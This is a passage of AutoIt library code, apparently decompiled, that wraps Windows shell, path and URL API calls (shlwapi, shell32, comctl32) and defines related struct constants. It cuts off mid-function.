        If @error Or Not $acall[0x0] Or (Not $acall[0x2]) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tptr = DllStructCreate("ptr[" & $acall[0x2] & "]", $acall[0x0])
        Dim $aret[$acall[0x2] + 0x1] = [$acall[0x2]]
        For $i = 0x1 To $acall[0x2]
            $aret[$i] = _WinAPI_GetString(DllStructGetData($tptr, 0x1, $i))
        Next
        DllCall("kernel32.dll", "handle", "LocalFree", "handle", $acall[0x0])
        Return $aret
    EndFunc    ; -> _WinAPI_CommandLineToArgv

    Func _WinAPI_IsNameInExpression($sstring, $spattern, $bcasesensitive = False)
        If Not $bcasesensitive Then $spattern = StringUpper($spattern)
        Local $tus1 = __us($spattern)
        Local $tus2 = __us($sstring)
        Local $acall = DllCall("ntdll.dll", "boolean", "RtlIsNameInExpression", "struct*", $tus1, "struct*", $tus2, "boolean", Not $bcasesensitive, "ptr", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsNameInExpression

    Func _WinAPI_ParseURL($surl)
        Local $tagparsedurl = "dword Size;ptr Protocol;uint cchProtocol;ptr Suffix;uint cchSuffix;uint Scheme"
        Local $tpurl = DllStructCreate($tagparsedurl)
        DllStructSetData($tpurl, 0x1, DllStructGetSize($tpurl))
        Local $turl = DllStructCreate("wchar[4096]")
        DllStructSetData($turl, 0x1, $surl)
        Local $acall = DllCall("shlwapi.dll", "long", "ParseURLW", "struct*", $turl, "struct*", $tpurl)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Local $aret[0x3]
        $aret[0x0] = DllStructGetData(DllStructCreate("wchar[" & DllStructGetData($tpurl, 0x3) & "]", DllStructGetData($tpurl, 0x2)), 0x1)
        $aret[0x1] = DllStructGetData(DllStructCreate("wchar[" & DllStructGetData($tpurl, 0x5) & "]", DllStructGetData($tpurl, 0x4)), 0x1)
        $aret[0x2] = DllStructGetData($tpurl, 0x6)
        Return $aret
    EndFunc    ; -> _WinAPI_ParseURL

    Func _WinAPI_ParseUserName($suser)
        If Not __dll("credui.dll") Then Return SetError(0x67, 0x0, 0x0)
        Local $acall = DllCall("credui.dll", "dword", "CredUIParseUserNameW", "wstr", $suser, "wstr", '', "ulong", 0x1000, "wstr", '', "ulong", 0x1000)
        If @error Then Return SetError(@error, @extended, 0x0)
        Switch $acall[0x0]
        Case 0x0
        Case 0x523
            If StringStripWS($suser, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then
                $acall[0x2] = $suser
                $acall[0x4] = ''
            Else
                ContinueCase
            EndIf
        Case Else
            Return SetError(0xa, $acall[0x0], 0x0)
        EndSwitch
        Local $aret[0x2]
        $aret[0x0] = $acall[0x4]
        $aret[0x1] = $acall[0x2]
        Return $aret
    EndFunc    ; -> _WinAPI_ParseUserName

    Func _WinAPI_PathAddBackslash($sfilepath)
        Local $tpath = DllStructCreate("wchar[260]")
        DllStructSetData($tpath, 0x1, $sfilepath)
        Local $acall = DllCall("shlwapi.dll", "ptr", "PathAddBackslashW", "struct*", $tpath)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return DllStructGetData($tpath, 0x1)
    EndFunc    ; -> _WinAPI_PathAddBackslash

    Func _WinAPI_PathAddExtension($sfilepath, $sext = '')
        Local $tpath = DllStructCreate("wchar[260]")
        DllStructSetData($tpath, 0x1, $sfilepath)
        If Not StringStripWS($sext, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sext = Null
        Local $acall = DllCall("shlwapi.dll", "bool", "PathAddExtensionW", "struct*", $tpath, "wstr", $sext)
        If @error Then Return SetError(@error, @extended, '')
        Return SetExtended($acall[0x0], DllStructGetData($tpath, 0x1))
    EndFunc    ; -> _WinAPI_PathAddExtension

    Func _WinAPI_PathAppend($sfilepath, $smore)
        Local $tpath = DllStructCreate("wchar[260]")
        DllStructSetData($tpath, 0x1, $sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathAppendW", "struct*", $tpath, "wstr", $smore)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return DllStructGetData($tpath, 0x1)
    EndFunc    ; -> _WinAPI_PathAppend

    Func _WinAPI_PathBuildRoot($idrive)
        Local $acall = DllCall("shlwapi.dll", "ptr", "PathBuildRootW", "wstr", '', "int", $idrive)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathBuildRoot

    Func _WinAPI_PathCanonicalize($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathCanonicalizeW", "wstr", '', "wstr", $sfilepath)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, $sfilepath)
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathCanonicalize

    Func _WinAPI_PathCommonPrefix($spath1, $spath2)
        Local $acall = DllCall("shlwapi.dll", "int", "PathCommonPrefixW", "wstr", $spath1, "wstr", $spath2, "wstr", '')
        If @error Then Return SetError(@error, @extended, '')
        Return SetExtended($acall[0x0], $acall[0x3])
    EndFunc    ; -> _WinAPI_PathCommonPrefix

    Func _WinAPI_PathCompactPath($hwnd, $sfilepath, $iwidth = 0x0)
        If $iwidth < 0x1 Then
            Local $trect = DllStructCreate($TAGRECT)
            DllCall("user32.dll", "bool", "GetClientRect", "hwnd", $hwnd, "struct*", $trect)
            $iwidth += DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
        EndIf
        Local $acall = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, $sfilepath)
        Local $hdc = $acall[0x0]
        Local Const $WM_GETFONT = 0x31
        $acall = DllCall("user32.dll", "ptr", "SendMessage", "hwnd", $hwnd, "uint", $WM_GETFONT, "wparam", 0x0, "lparam", 0x0)
        Local $hback = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $acall[0x0])
        Local $ierror = 0x0
        $acall = DllCall("shlwapi.dll", "bool", "PathCompactPathW", "handle", $hdc, "wstr", $sfilepath, "int", $iwidth)
        If @error Or Not $acall[0x0] Then $ierror = @error + 0xa
        DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $hback[0x0])
        DllCall("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
        If $ierror Then Return SetError($ierror, 0x0, $sfilepath)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_PathCompactPath

    Func _WinAPI_PathCompactPathEx($sfilepath, $imax)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathCompactPathExW", "wstr", '', "wstr", $sfilepath, "uint", $imax + 0x1, "dword", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, $sfilepath)
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathCompactPathEx

    Func _WinAPI_PathCreateFromUrl($surl)
        Local $acall = DllCall("shlwapi.dll", "long", "PathCreateFromUrlW", "wstr", $surl, "wstr", '', "dword*", 0x1000, "dword", 0x0)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_PathCreateFromUrl

    Func _WinAPI_PathFindExtension($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "wstr", "PathFindExtensionW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathFindExtension

    Func _WinAPI_PathFindFileName($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "wstr", "PathFindFileNameW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, $sfilepath)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathFindFileName

    Func _WinAPI_PathFindNextComponent($sfilepath)
        Local $tpath = DllStructCreate("wchar[" & (StringLen($sfilepath) + 0x1) & "]")
        DllStructSetData($tpath, 0x1, $sfilepath)
        Local $acall = DllCall("shlwapi.dll", "ptr", "PathFindNextComponentW", "struct*", $tpath)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return _WinAPI_GetString($acall[0x0])
    EndFunc    ; -> _WinAPI_PathFindNextComponent

    Func _WinAPI_PathFindOnPath(Const $sfilepath, $AEXTRAPATHS = '', Const $SPATHDELIMITER = @LF)
        Local $iextracount = 0x0
        If IsString($AEXTRAPATHS) Then
            If StringLen($AEXTRAPATHS) Then
                $AEXTRAPATHS = StringSplit($AEXTRAPATHS, $SPATHDELIMITER, $STR_ENTIRESPLIT + $STR_NOCOUNT)
                $iextracount = UBound($AEXTRAPATHS, $UBOUND_ROWS)
            EndIf
        ElseIf IsArray($AEXTRAPATHS) Then
            $iextracount = UBound($AEXTRAPATHS)
        EndIf
        Local $tpaths, $tpathptrs
        If $iextracount Then
            Local $tagstruct = ''
            For $path In $AEXTRAPATHS
                $tagstruct &= "wchar[" & StringLen($path) + 0x1 & "];"
            Next
            $tpaths = DllStructCreate($tagstruct)
            $tpathptrs = DllStructCreate("ptr[" & $iextracount + 0x1 & "]")
            For $i = 0x1 To $iextracount
                DllStructSetData($tpaths, $i, $AEXTRAPATHS[$i + -1])
                DllStructSetData($tpathptrs, 0x1, DllStructGetPtr($tpaths, $i), $i)
            Next
            DllStructSetData($tpathptrs, 0x1, Ptr(0x0), $iextracount + 0x1)
        EndIf
        Local $acall = DllCall("shlwapi.dll", "bool", "PathFindOnPathW", "wstr", $sfilepath, "struct*", $tpathptrs)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, $sfilepath)
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathFindOnPath

    Func _WinAPI_PathGetArgs($sfilepath)
        Local $tpath = DllStructCreate("wchar[" & (StringLen($sfilepath) + 0x1) & "]")
        DllStructSetData($tpath, 0x1, $sfilepath)
        Local $acall = DllCall("shlwapi.dll", "ptr", "PathGetArgsW", "struct*", $tpath)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return _WinAPI_GetString($acall[0x0])
    EndFunc    ; -> _WinAPI_PathGetArgs

    Func _WinAPI_PathGetCharType($schar)
        Local $acall = DllCall("shlwapi.dll", "uint", "PathGetCharTypeW", "word", AscW($schar))
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathGetCharType

    Func _WinAPI_PathGetDriveNumber($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "int", "PathGetDriveNumberW", "wstr", $sfilepath)
        If @error Or ($acall[0x0] = + -1) Then Return SetError(@error, @extended, '')
        Return Chr($acall[0x0] + 0x41) & ":"
    EndFunc    ; -> _WinAPI_PathGetDriveNumber

    Func _WinAPI_PathIsContentType($sfilepath, $stype)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsContentTypeW", "wstr", $sfilepath, "wstr", $stype)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsContentType

    Func _WinAPI_PathIsExe($sfilepath)
        Local $acall = DllCall("shell32.dll", "bool", "PathIsExe", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsExe

    Func _WinAPI_PathIsFileSpec($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsFileSpecW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsFileSpec

    Func _WinAPI_PathIsLFNFileSpec($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsLFNFileSpecW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsLFNFileSpec

    Func _WinAPI_PathIsRelative($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsRelativeW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsRelative

    Func _WinAPI_PathIsRoot($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsRootW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsRoot

    Func _WinAPI_PathIsSameRoot($spath1, $spath2)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsSameRootW", "wstr", $spath1, "wstr", $spath2)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsSameRoot

    Func _WinAPI_PathIsSystemFolder($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsSystemFolderW", "wstr", $sfilepath, "dword", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsSystemFolder

    Func _WinAPI_PathIsUNC($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsUNCW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsUNC

    Func _WinAPI_PathIsUNCServer($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsUNCServerW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsUNCServer

    Func _WinAPI_PathIsUNCServerShare($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsUNCServerShareW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsUNCServerShare

    Func _WinAPI_PathMakeSystemFolder($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathMakeSystemFolderW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathMakeSystemFolder

    Func _WinAPI_PathMatchSpec($sfilepath, $sspec)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathMatchSpecW", "wstr", $sfilepath, "wstr", $sspec)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathMatchSpec

    Func _WinAPI_PathParseIconLocation($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "int", "PathParseIconLocationW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, 0x0)
        Local $aret[0x2]
        $aret[0x0] = $acall[0x1]
        $aret[0x1] = $acall[0x0]
        Return $aret
    EndFunc    ; -> _WinAPI_PathParseIconLocation

    Func _WinAPI_PathRelativePathTo($spathfrom, $bdirfrom, $spathto, $bdirto)
        If $bdirfrom Then
            $bdirfrom = 0x10
        EndIf
        If $bdirto Then
            $bdirto = 0x10
        EndIf
        Local $acall = DllCall("shlwapi.dll", "bool", "PathRelativePathToW", "wstr", '', "wstr", $spathfrom, "dword", $bdirfrom, "wstr", $spathto, "dword", $bdirto)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathRelativePathTo

    Func _WinAPI_PathRemoveArgs($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "none", "PathRemoveArgsW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathRemoveArgs

    Func _WinAPI_PathRemoveBackslash($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "ptr", "PathRemoveBackslashW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathRemoveBackslash

    Func _WinAPI_PathRemoveExtension($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "none", "PathRemoveExtensionW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathRemoveExtension

    Func _WinAPI_PathRemoveFileSpec($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathRemoveFileSpecW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, '')
        Return SetExtended($acall[0x0], $acall[0x1])
    EndFunc    ; -> _WinAPI_PathRemoveFileSpec

    Func _WinAPI_PathRenameExtension($sfilepath, $sext)
        Local $tpath = DllStructCreate("wchar[260]")
        DllStructSetData($tpath, 0x1, $sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathRenameExtensionW", "struct*", $tpath, "wstr", $sext)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return DllStructGetData($tpath, 0x1)
    EndFunc    ; -> _WinAPI_PathRenameExtension

    Func _WinAPI_PathSearchAndQualify($sfilepath, $bexists = False)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathSearchAndQualifyW", "wstr", $sfilepath, "wstr", '', "int", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        If $bexists And Not FileExists($acall[0x2]) Then Return SetError(0x14, 0x0, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_PathSearchAndQualify

    Func _WinAPI_PathSkipRoot($sfilepath)
        Local $tpath = DllStructCreate("wchar[" & (StringLen($sfilepath) + 0x1) & "]")
        DllStructSetData($tpath, 0x1, $sfilepath)
        Local $acall = DllCall("shlwapi.dll", "ptr", "PathSkipRootW", "struct*", $tpath)
        If @error Then Return SetError(@error, @extended, '')
        If Not $acall[0x0] Then Return $sfilepath
        Return _WinAPI_GetString($acall[0x0])
    EndFunc    ; -> _WinAPI_PathSkipRoot

    Func _WinAPI_PathStripPath($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "none", "PathStripPathW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathStripPath

    Func _WinAPI_PathStripToRoot($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathStripToRootW", "wstr", $sfilepath)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathStripToRoot

    Func _WinAPI_PathUndecorate($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "none", "PathUndecorateW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathUndecorate

    Func _WinAPI_PathUnExpandEnvStrings($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathUnExpandEnvStringsW", "wstr", $sfilepath, "wstr", '', "uint", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_PathUnExpandEnvStrings

    Func _WinAPI_PathUnmakeSystemFolder($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathUnmakeSystemFolderW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathUnmakeSystemFolder

    Func _WinAPI_PathUnquoteSpaces($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "none", "PathUnquoteSpacesW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathUnquoteSpaces

    Func _WinAPI_PathYetAnotherMakeUniqueName($sfilepath)
        Local $acall = DllCall("shell32.dll", "int", "PathYetAnotherMakeUniqueName", "wstr", '', "wstr", $sfilepath, "ptr", 0x0, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_PathYetAnotherMakeUniqueName

    Func _WinAPI_ShellGetImageList($bsmall = False)
        Local $plarge, $psmall, $tptr = DllStructCreate("ptr")
        If $bsmall Then
            $plarge = 0x0
            $psmall = DllStructGetPtr($tptr)
        Else
            $plarge = DllStructGetPtr($tptr)
            $psmall = 0x0
        EndIf
        Local $acall = DllCall("shell32.dll", "int", "Shell_GetImageLists", "ptr", $plarge, "ptr", $psmall)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return DllStructGetData($tptr, 0x1)
    EndFunc    ; -> _WinAPI_ShellGetImageList

    Func _WinAPI_UrlApplyScheme($surl, $iflags = 0x1)
        Local $acall = DllCall("shlwapi.dll", "long", "UrlApplySchemeW", "wstr", $surl, "wstr", '', "dword*", 0x1000, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_UrlApplyScheme

    Func _WinAPI_UrlCanonicalize($surl, $iflags)
        Local $acall = DllCall("shlwapi.dll", "long", "UrlCanonicalizeW", "wstr", $surl, "wstr", '', "dword*", 0x1000, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_UrlCanonicalize

    Func _WinAPI_UrlCombine($surl, $spart, $iflags = 0x0)
        Local $acall = DllCall("shlwapi.dll", "long", "UrlCombineW", "wstr", $surl, "wstr", $spart, "wstr", '', "dword*", 0x1000, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_UrlCombine

    Func _WinAPI_UrlCompare($surl1, $surl2, $bignoreslash = False)
        Local $acall = DllCall("shlwapi.dll", "int", "UrlCompareW", "wstr", $surl1, "wstr", $surl2, "bool", $bignoreslash)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UrlCompare

    Func _WinAPI_UrlCreateFromPath($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "long", "UrlCreateFromPathW", "wstr", $sfilepath, "wstr", '', "dword*", 0x1000, "dword", 0x0)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] < 0x0 Or $acall[0x0] > 0x1 Then
            Return SetError(0xa, $acall[0x0], '')
        EndIf
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_UrlCreateFromPath

    Func _WinAPI_UrlFixup($surl)
        Local $acall = DllCall("shlwapi.dll", "long", "UrlFixupW", "wstr", $surl, "wstr", '', "dword", 0x1000)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_UrlFixup

    Func _WinAPI_UrlGetPart($surl, $ipart)
        Local $acall = DllCall("shlwapi.dll", "long", "UrlGetPartW", "wstr", $surl, "wstr", '', "dword*", 0x1000, "dword", $ipart, "dword", 0x0)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_UrlGetPart

    Func _WinAPI_UrlHash($surl, $ilength = 0x20)
        If $ilength <= 0x0 Or $ilength > 0x100 Then Return SetError(0x100, 0x0, 0x0)
        Local $tdata = DllStructCreate("byte[" & $ilength & "]")
        Local $acall = DllCall("shlwapi.dll", "long", "UrlHashW", "wstr", $surl, "struct*", $tdata, "dword", $ilength)
        If @error Then Return SetError(@error + 0xa, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return DllStructGetData($tdata, 0x1)
    EndFunc    ; -> _WinAPI_UrlHash

    Func _WinAPI_UrlIs($surl, $itype = 0x0)
        Local $acall = DllCall("shlwapi.dll", "bool", "UrlIsW", "wstr", $surl, "uint", $itype)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UrlIs

#EndRegion Public Functions
#Region Internal Functions
    Func __us($sstring, $ilength = 0x0)
        If $ilength Then
            $sstring = StringLeft($sstring, $ilength)
        Else
            $ilength = StringLen($sstring)
        EndIf
        Local $tus = DllStructCreate("ushort;ushort;ptr;wchar[" & ($ilength + 0x1) & "]")
        DllStructSetData($tus, 0x1, 0x2 * StringLen($sstring))
        DllStructSetData($tus, 0x2, 0x2 * $ilength)
        DllStructSetData($tus, 0x3, DllStructGetPtr($tus, 0x4))
        DllStructSetData($tus, 0x4, $sstring)
        Return $tus
    EndFunc    ; -> __us

#EndRegion Internal Functions
#Region Global Variables and Constants
    Global Const $TAGNOTIFYICONDATA = "struct;dword Size;hwnd hWnd;uint ID;uint Flags;uint CallbackMessage;ptr hIcon;wchar Tip[128];dword State;dword StateMask;wchar Info[256];uint Version;wchar Info" & _
        "Title[64];dword InfoFlags;endstruct"
    Global Const $TAGNOTIFYICONDATA_V3 = $TAGNOTIFYICONDATA & ";" & $TAGGUID
    Global Const $TAGNOTIFYICONDATA_V4 = $TAGNOTIFYICONDATA_V3 & ";ptr hBalloonIcon;"
    Global Const $TAGSHELLEXECUTEINFO = "dword Size;ulong Mask;hwnd hWnd;ptr Verb;ptr File;ptr Parameters;ptr Directory;int Show;ulong_ptr hInstApp;ptr IDList;ptr Class;ulong_ptr hKeyClass;dword HotKey" & _
        ";ptr hMonitor;ptr hProcess"
    Global Const $TAGSHFILEINFO = "ptr hIcon;int iIcon;dword Attributes;wchar DisplayName[260];wchar TypeName[80]"
    Global Const $TAGSHFILEOPSTRUCT = "hwnd hWnd;uint Func;ptr From;ptr To;dword Flags;int fAnyOperationsAborted;ptr hNameMappings;ptr ProgressTitle"
    Global Const $TAGSHFOLDERCUSTOMSETTINGS = "dword Size;dword Mask;ptr GUID;ptr WebViewTemplate;dword SizeWVT;ptr WebViewTemplateVersion;ptr InfoTip;dword SizeIT;ptr CLSID;dword Flags;ptr IconFile;dword Si" & _
        "zeIF;int IconIndex;ptr Logo;dword SizeL"
    Global Const $TAGSHSTOCKICONINFO = "dword Size;ptr hIcon;int SysImageIndex;int iIcon;wchar Path[260]"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_DefSubclassProc($hwnd, $imsg, $wparam, $lparam)
        Local $acall = DllCall("comctl32.dll", "lresult", "DefSubclassProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DefSubclassProc

    Func _WinAPI_DllGetVersion($sfilepath)
        Local $tversion = DllStructCreate("dword[5]")
        DllStructSetData($tversion, 0x1, DllStructGetSize($tversion), 0x1)
        Local $acall = DllCall($sfilepath, "uint", "DllGetVersion", "struct*", $tversion)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Local $aret[0x4]
        For $i = 0x0 To 0x3
            $aret[$i] = DllStructGetData($tversion, 0x1, $i + 0x2)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_DllGetVersion

    Func _WinAPI_FindExecutable($sfilename, $sdirectory = '')
        Local $acall = DllCall("shell32.dll", "INT", "FindExecutableW", "wstr", $sfilename, "wstr", $sdirectory, "wstr", '')
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] <= 0x20 Then Return SetError(0xa, $acall[0x0], '')
        Return SetExtended($acall[0x0], $acall[0x3])
    EndFunc    ; -> _WinAPI_FindExecutable

    Func _WinAPI_GetAllUsersProfileDirectory()
        Local $acall = DllCall("userenv.dll", "bool", "GetAllUsersProfileDirectoryW", "wstr", '', "dword*", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_GetAllUsersProfileDirectory

    Func _WinAPI_GetDefaultUserProfileDirectory()
        Local $acall = DllCall("userenv.dll", "bool", "GetDefaultUserProfileDirectoryW", "wstr", '', "dword*", 0x1000)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_GetDefaultUserProfileDirectory

    Func _WinAPI_GetWindowSubclass($hwnd, $psubclassproc, $idsubclass)
        Local $acall = DllCall("comctl32.dll", "bool", "GetWindowSubclass", "hwnd", $hwnd, "ptr", $psubclassproc, "uint_ptr", $idsubclass, "dword_ptr*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x4]
    EndFunc    ; -> _WinAPI_GetWindowSubclass

    Func _WinAPI_RemoveWindowSubclass($hwnd, $psubclassproc, $idsubclass)
        Local $acall = DllCall("comctl32.dll", "bool", "RemoveWindowSubclass", "hwnd", $hwnd, "ptr", $psubclassproc, "uint_ptr", $idsubclass)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RemoveWindowSubclass

    Func _WinAPI_SetCurrentProcessExplicitAppUserModelID($sappid)
        Local $acall = DllCall("shell32.dll", "long", "SetCurrentProcessExplicitAppUserModelID", "wstr", $sappid)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_SetCurrentProcessExplicitAppUserModelID

    Func _WinAPI_SetWindowSubclass($hwnd, $psubclassproc, $idsubclass, $pdata = 0x0)
